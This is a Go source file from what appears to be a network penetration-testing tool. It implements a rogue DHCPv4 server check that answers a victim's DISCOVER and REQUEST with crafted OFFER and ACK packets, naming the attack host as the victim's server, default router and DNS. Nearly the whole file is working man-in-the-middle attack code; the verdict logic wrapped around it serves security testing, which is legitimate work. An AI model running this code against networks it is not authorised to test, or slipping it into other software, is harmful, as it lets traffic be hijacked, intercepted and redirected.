// roguedhcp.go implements the rogue DHCPv4 server check. Impact
// temporary, restore decay with the 1800 s bound the lease announces,
// affects clients: the OFFER and ACK answer the victim's DISCOVER and
// REQUEST with a lease from the attack leg's own IPv4 as server, router,
// and DNS, and the victim drops the lease when its lifetime runs out.

package ip6

import (
	"context"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"net"
	"time"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/common/errs"

	"go.aledante.io/FlowSeer/src/edge/netpen/attacks/internal/craft"
	"go.aledante.io/FlowSeer/src/edge/netpen/check"
	"go.aledante.io/FlowSeer/src/edge/netpen/link"
)

type rogueDHCPFinding struct {
	Action   string `json:"action"`
	ServerID string `json:"server_id"`
	OfferIP  string `json:"offer_ip"`
	LeaseTTL uint32 `json:"lease_ttl"`
}

// RunRogueDHCP waits for a DISCOVER from the target's victim within the
// window, answers it with an OFFER carrying the DISCOVER's transaction id
// and leasing the target's offer IP from the attack leg's own IPv4, then
// waits for the victim's REQUEST and answers it with the ACK. The subnet
// mask is probe content. The predicate is the REQUEST's server identifier
// option (RFC 2131 section 4.4.1 selects among offers by it): one naming
// the attack leg's IPv4 confirms, one naming another server resists, no
// REQUEST after the OFFER resists, and no DISCOVER within the window is
// pending, since there is nothing to answer.
func RunRogueDHCP(ctx context.Context, deps check.Deps) (check.Verdict, error) {
	if err := deps.Target.Need(check.FieldVictim, check.FieldVictimMAC, check.FieldOfferIP); err != nil {
		return check.Verdict{}, err
	}
	addr := deps.AttackLeg.Addr()
	victim := deps.Target.Victim
	offerIP := deps.Target.OfferIP

	var discover *layers.DHCPv4
	_, pre, err := check.First(ctx, deps.AttackLeg, deps.Observe, func(data []byte) bool {
		msg, ok := isDiscoverFrom(data, victim.MAC)
		if ok {
			discover = msg
		}
		return ok
	})
	if err != nil {
		if ctx.Err() != nil {
			return check.Verdict{}, ctx.Err()
		}
		return check.Verdict{}, errs.Wrap(err, "roguedhcp: receive discover")
	}
	if discover == nil {
		return check.Pending(fmt.Sprintf("no DISCOVER from the victim in %s", pre.Elapsed.Round(time.Millisecond))), nil
	}

	leaseTime := make([]byte, 4)
	binary.BigEndian.PutUint32(leaseTime, 1800)

	offer, err := craftDHCPOffer(addr, victim, offerIP, discover.Xid, leaseTime)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "roguedhcp: craft offer")
	}
	if err := deps.AttackLeg.Send(ctx, offer); err != nil {
		return check.Verdict{}, errs.Wrap(err, "roguedhcp: send offer")
	}

	detail, _ := json.Marshal(rogueDHCPFinding{
		Action:   "rogue-dhcpv4-server",
		ServerID: addr.IPv4.String(),
		OfferIP:  offerIP.String(),
		LeaseTTL: 1800,
	})
	deps.Emitter.Finding("dhcp", detail)

	var serverID net.IP
	var request *layers.DHCPv4
	_, obs, err := check.First(ctx, deps.AttackLeg, deps.Observe-pre.Elapsed, func(data []byte) bool {
		msg, id, ok := isRequestNaming(data, victim.MAC)
		if ok {
			request, serverID = msg, id
		}
		return ok
	})
	if err != nil {
		if ctx.Err() != nil {
			return check.Verdict{}, ctx.Err()
		}
		return check.Verdict{}, errs.Wrap(err, "roguedhcp: receive request")
	}
	observed := pre.Elapsed + obs.Elapsed
	switch {
	case request == nil:
		return check.Resisted(fmt.Sprintf("the victim did not request %s", offerIP), observed), nil
	case !serverID.Equal(addr.IPv4):
		return check.Resisted(fmt.Sprintf("the victim requested from server %s", serverID), observed), nil
	}

	ack, err := craftDHCPAck(addr, victim, offerIP, request.Xid, leaseTime)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "roguedhcp: craft ack")
	}
	if err := deps.AttackLeg.Send(ctx, ack); err != nil {
		return check.Verdict{}, errs.Wrap(err, "roguedhcp: send ack")
	}
	return check.Confirmed(fmt.Sprintf("the victim requested %s from the attack leg", offerIP), observed), nil
}

func craftDHCPOffer(addr link.Addr, client check.Host, offerIP net.IP, xid uint32, leaseTime []byte) ([]byte, error) {
	rogueIP := addr.IPv4
	eth := &layers.Ethernet{
		DstMAC:       client.MAC,
		SrcMAC:       addr.MAC,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      128,
		SrcIP:    rogueIP,
		DstIP:    client.IP,
		Protocol: layers.IPProtocolUDP,
	}
	udp := &layers.UDP{
		SrcPort: 67,
		DstPort: 68,
	}
	_ = udp.SetNetworkLayerForChecksum(ip)

	dhcp := &layers.DHCPv4{
		Operation:    layers.DHCPOpReply,
		HardwareType: layers.LinkTypeEthernet,
		HardwareLen:  6,
		Xid:          xid,
		Flags:        0,
		ClientIP:     net.IPv4(0, 0, 0, 0),
		YourClientIP: offerIP,
		NextServerIP: rogueIP,
		RelayAgentIP: net.IPv4(0, 0, 0, 0),
		ClientHWAddr: client.MAC,
		Options: layers.DHCPOptions{
			layers.NewDHCPOption(layers.DHCPOptMessageType, []byte{byte(layers.DHCPMsgTypeOffer)}),
			layers.NewDHCPOption(layers.DHCPOptServerID, rogueIP.To4()),
			layers.NewDHCPOption(layers.DHCPOptLeaseTime, leaseTime),
			layers.NewDHCPOption(layers.DHCPOptSubnetMask, net.IPv4(255, 255, 255, 0).To4()),
			layers.NewDHCPOption(layers.DHCPOptRouter, rogueIP.To4()),
			layers.NewDHCPOption(layers.DHCPOptDNS, rogueIP.To4()),
		},
	}
	return craft.Default(eth, ip, udp, dhcp)
}

func craftDHCPAck(addr link.Addr, client check.Host, offerIP net.IP, xid uint32, leaseTime []byte) ([]byte, error) {
	rogueIP := addr.IPv4
	eth := &layers.Ethernet{
		DstMAC:       client.MAC,
		SrcMAC:       addr.MAC,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      128,
		SrcIP:    rogueIP,
		DstIP:    client.IP,
		Protocol: layers.IPProtocolUDP,
	}
	udp := &layers.UDP{
		SrcPort: 67,
		DstPort: 68,
	}
	_ = udp.SetNetworkLayerForChecksum(ip)

	dhcp := &layers.DHCPv4{
		Operation:    layers.DHCPOpReply,
		HardwareType: layers.LinkTypeEthernet,
		HardwareLen:  6,
		Xid:          xid,
		Flags:        0,
		ClientIP:     client.IP,
		YourClientIP: offerIP,
		NextServerIP: rogueIP,
		RelayAgentIP: net.IPv4(0, 0, 0, 0),
		ClientHWAddr: client.MAC,
		Options: layers.DHCPOptions{
			layers.NewDHCPOption(layers.DHCPOptMessageType, []byte{byte(layers.DHCPMsgTypeAck)}),
			layers.NewDHCPOption(layers.DHCPOptServerID, rogueIP.To4()),
			layers.NewDHCPOption(layers.DHCPOptLeaseTime, leaseTime),
			layers.NewDHCPOption(layers.DHCPOptSubnetMask, net.IPv4(255, 255, 255, 0).To4()),
			layers.NewDHCPOption(layers.DHCPOptRouter, rogueIP.To4()),
			layers.NewDHCPOption(layers.DHCPOptDNS, rogueIP.To4()),
		},
	}
	return craft.Default(eth, ip, udp, dhcp)
}

var _ gopacket.SerializableLayer = (*layers.DHCPv4)(nil)
